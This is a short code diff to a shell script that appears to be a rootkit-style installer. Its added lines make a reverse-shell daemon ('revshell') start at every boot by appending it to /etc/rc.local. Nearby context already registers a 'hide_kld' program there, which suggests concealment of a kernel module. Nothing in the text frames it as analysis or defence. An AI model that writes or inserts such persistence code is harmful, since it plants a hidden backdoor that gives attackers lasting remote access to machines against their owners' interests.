@@ -169,6 +169,11 @@ if [ ! -f /etc/rc.local ]; then
 fi
 chmod +x /etc/rc.local
 
+# Add revshell daemon persistence to /etc/rc.local 
+if ! grep -q 'revshell' /etc/rc.local 2>/dev/null; then 
+    printf '/usr/local/bin/revshell &\n' >> /etc/rc.local 
+fi
+
 # Ensures no duplicate entries in rc.local
 if ! grep -q "hide_kld" /etc/rc.local; then
     echo "$ABS_PATH &" >> /etc/rc.local
